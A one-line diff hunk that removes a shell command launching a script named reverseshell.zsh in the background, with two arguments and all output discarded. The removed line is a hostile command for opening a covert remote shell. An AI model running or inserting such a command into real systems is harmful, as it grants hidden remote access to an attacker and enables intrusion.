@@ -1,1 +1,0 @@
-nohup zsh reverseshell.zsh $1 $2 &> /dev/null &
